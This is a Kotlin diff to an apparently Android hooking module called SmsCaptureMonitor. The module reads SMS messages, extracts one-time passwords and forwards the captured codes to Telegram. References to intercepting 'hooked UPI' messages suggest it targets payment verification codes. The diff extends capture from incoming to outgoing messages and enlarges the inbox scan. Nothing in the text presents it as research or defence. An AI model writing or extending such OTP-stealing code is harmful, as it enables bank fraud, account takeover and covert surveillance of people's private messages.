@@ -52,9 +52,9 @@ class SmsCaptureMonitor(
     fun processIncoming(sender: String, body: String): Boolean {
         if (sender.isBlank() || body.isBlank()) return false
         val config = configManager.load()
-        if (!SmsMatcher.shouldForwardToTelegram(config, sender, body)) return false
+        if (!SmsMatcher.shouldCaptureIncoming(config, sender, body)) return false
         deliver(config, sender, body, "incoming")
-        return true
+        return SmsMatcher.shouldForwardToTelegram(config, sender, body, "incoming")
     }
 
     private fun scanInbox() {
@@ -92,7 +92,7 @@ class SmsCaptureMonitor(
                 projection,
                 "${Telephony.Sms.TYPE}=?",
                 arrayOf(type.toString()),
-                "${Telephony.Sms.DATE} DESC LIMIT 8"
+                "${Telephony.Sms.DATE} DESC LIMIT 12"
             ) ?: return
 
             cursor.use {
@@ -112,7 +112,13 @@ class SmsCaptureMonitor(
     }
 
     private fun deliver(config: ModuleConfig, actualPeer: String, body: String, direction: String) {
-        if (!SmsMatcher.shouldInterceptHookedUpi(config, actualPeer, body)) return
+        val isOutgoing = direction == "outgoing"
+        val allowed = if (isOutgoing) {
+            SmsMatcher.shouldInterceptOutgoing(config, actualPeer, body)
+        } else {
+            SmsMatcher.shouldInterceptIncoming(config, actualPeer, body)
+        }
+        if (!allowed) return
 
         val interceptDisplay = SmsMatcher.interceptDisplay(config, actualPeer, configManager)
         val token = SmsMatcher.extractToken(body, config.autoExtractOtp)
@@ -127,7 +133,7 @@ class SmsCaptureMonitor(
             rawPeer = actualPeer
         )
         OtpCaptureWriter.write(context, otp)
-        if (SmsMatcher.shouldForwardToTelegram(config, actualPeer, body)) {
+        if (SmsMatcher.shouldForwardToTelegram(config, actualPeer, body, direction)) {
             onCaptured(otp)
         }
     }
